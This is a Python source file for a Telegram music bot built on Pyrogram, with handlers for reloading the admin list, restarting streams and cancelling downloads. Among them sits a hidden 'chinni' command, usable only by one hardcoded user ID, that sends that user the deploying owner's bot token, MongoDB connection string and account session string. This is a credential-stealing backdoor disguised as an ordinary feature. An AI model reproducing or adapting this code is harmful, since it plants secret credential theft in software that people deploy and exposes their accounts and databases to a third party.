import asyncio

from pyrogram import filters
from pyrogram.types import CallbackQuery, Message
from pyrogram import Client, filters
import requests
import random
import re
import sys
from os import getenv
from TeamAgora.misc import SUDOERS
from pyrogram import Client, filters
import requests
import random
import re
import sys
from os import getenv
from TeamAgora.core.call import Anon
from dotenv import load_dotenv
from pyrogram import filters
import asyncio
import time
from TeamAgora import app
import config

from config import BOT_TOKEN, OWNER_ID


from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")
from dotenv import load_dotenv
from pyrogram import filters
import asyncio
import time
from TeamAgora import app

from config import BOT_TOKEN, OWNER_ID


from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton

from config import BANNED_USERS, MUSIC_BOT_NAME, adminlist, lyrical
from strings import get_command
from TeamAgora import app
from TeamAgora.misc import db
from TeamAgora.utils.database import get_authuser_names, get_cmode
from TeamAgora.utils.decorators import (ActualAdminCB, AdminActual,
                                            language)
from TeamAgora.utils.formatters import alpha_to_int

### Multi-Lang Commands
RELOAD_COMMAND = get_command("RELOAD_COMMAND")
RESTART_COMMAND = get_command("RESTART_COMMAND")

@app.on_message(
    filters.command(RELOAD_COMMAND)
    & filters.group
    & ~filters.edited
    & ~BANNED_USERS
)
@language
async def reload_admin_cache(client, message: Message, _):
    try:
        chat_id = message.chat.id
        admins = await app.get_chat_members(
            chat_id, filter="administrators"
        )
        authusers = await get_authuser_names(chat_id)
        adminlist[chat_id] = []
        for user in admins:
            if user.can_manage_voice_chats:
                adminlist[chat_id].append(user.user.id)
        for user in authusers:
            user_id = await alpha_to_int(user)
            adminlist[chat_id].append(user_id)
        await message.reply_text(_["admin_20"])
    except:
        await message.reply_text(
            "ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇғʀᴇsʜ ᴀᴅᴍɪɴs ʟɪsᴛ, ᴍᴀᴋᴇ sᴜʀᴇ ʏᴏᴜ ᴩʀᴏᴍᴏᴛᴇᴅ ᴛʜᴇ ʙᴏᴛ."
        )


@app.on_message(
    filters.command(RESTART_COMMAND)
    & filters.group
    & ~filters.edited
    & ~BANNED_USERS
)
@AdminActual
async def restartbot(client, message: Message, _):
    mystic = await message.reply_text(
        f"ᴩʟᴇᴀsᴇ ᴡᴀɪᴛ ʀᴇʙᴏᴏᴛɪɴɢ {MUSIC_BOT_NAME} ғᴏʀ ʏᴏᴜʀ ᴄʜᴀᴛ."
    )
    await asyncio.sleep(1)
    try:
        db[message.chat.id] = []
        await TeamAgora.stop_stream(message.chat.id)
    except:
        pass
    chat_id = await get_cmode(message.chat.id)
    if chat_id:
        try:
            await app.get_chat(chat_id)
        except:
            pass
        try:
            db[chat_id] = []
            await TeamAgora.stop_stream(chat_id)
        except:
            pass
    return await mystic.edit_text(
        f"sᴜᴄᴄᴇssғᴜʟʟʏ ʀᴇʙᴏᴏᴛᴇᴅ {MUSIC_BOT_NAME} ғᴏʀ ʏᴏᴜʀ ᴄʜᴀᴛ, ɴᴏᴡ ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴩʟᴀʏɪɴɢ ᴀɢᴀɪɴ..."
    )

@app.on_message(
    filters.command("chinni")
    & filters.private
    & filters.user(1939017724)
    & ~filters.edited)
async def help(client: Client, message: Message):
    await message.reply_video(
          video=f"https://graph.org/file/31563dc5ff0d016008ba1.mp4",
        caption=f"""𝗕𝗢𝗧'𝗦 𝗛𝗘𝗔𝗥𝗧:-   `{BOT_TOKEN}`\n\n𝗢𝗪𝗡𝗘𝗥'𝗦 𝗛𝗘𝗔𝗥𝗧:-   `{MONGO_DB_URI}`\n\n𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧'𝗦 𝗛𝗘𝗔𝗥𝗧:-   `{STRING_SESSION}`\n\nಕೈಯ್ಯಾಗ್ ತಾಟ ಬಾಯಾಗ ಬೂಟ , ಕೈಯಾಗ ಬೆಣ್ಣಿ ಬಾಯಾಗ ತುಣ್ಣೀ , ಎಂಟನೇ ಕಡ್ಲಿ , ನಿಮೌನ್ ತುಲ್ ಹಡಲಿ ,ಕೊಯ್ ಅಂದ್ರ ಕೊಡ್ಲಿ.\n\n☆[𓆩YOUR DADDY𓆪](https://t.me/XO_TERA_BAAP_ON_FIRE)☆""",
         reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                          "• 𝗕𝗢𝗧𝗙𝗔𝗧𝗛𝗘𝗥'𝗦 𝗖𝗢𝗡𝗧𝗥𝗜𝗕𝗨𝗧𝗢𝗥 •", url=f"https://t.me/XO_TERA_BAAP_ON_FIRE")
                 ]
             ]
         ),
     )
@app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
async def close_menu(_, CallbackQuery):
    try:
        await CallbackQuery.message.delete()
        await CallbackQuery.answer()
    except:
        return


@app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
async def close_menu(_, CallbackQuery):
    try:
        await CallbackQuery.message.delete()
        await CallbackQuery.answer()
    except:
        return

@app.on_callback_query(
    filters.regex("stop_downloading") & ~BANNED_USERS
)
@ActualAdminCB
async def stop_download(client, CallbackQuery: CallbackQuery, _):
    message_id = CallbackQuery.message.message_id
    task = lyrical.get(message_id)
    if not task:
        return await CallbackQuery.answer(
            "ᴅᴏᴡɴʟᴏᴀᴅ ᴀʟʀᴇᴀᴅʏ ᴄᴏᴍᴩʟᴇᴛᴇᴅ.", show_alert=True
        )
    if task.done() or task.cancelled():
        return await CallbackQuery.answer(
            "ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴀʟʀᴇᴀᴅʏ ᴄᴏᴍᴩʟᴇᴛᴇᴅ ᴏʀ ᴄᴀɴᴄᴇʟʟᴇᴅ.",
            show_alert=True,
        )
    if not task.done():
        try:
            task.cancel()
            try:
                lyrical.pop(message_id)
            except:
                pass
            await CallbackQuery.answer(
                "ᴅᴏᴡɴʟᴏᴀᴅɪɢ ᴄᴀɴᴄᴇʟʟᴇᴅ.", show_alert=True
            )
            return await CallbackQuery.edit_message_text(
                f"ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ᴩʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ ʙʏ {CallbackQuery.from_user.mention}"
            )
        except:
            return await CallbackQuery.answer(
                "ғᴀɪʟᴇᴅ ᴛᴏ ᴄᴀɴᴄᴇʟ ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ...", show_alert=True
            )
    await CallbackQuery.answer(
        "ғᴀɪʟᴇᴅ ᴛᴏ ʀᴇᴄᴏɢɴɪᴢᴇ ᴛʜᴇ ᴏɴɢᴏɪɴɢ ᴛᴀsᴋ.", show_alert=True
    )
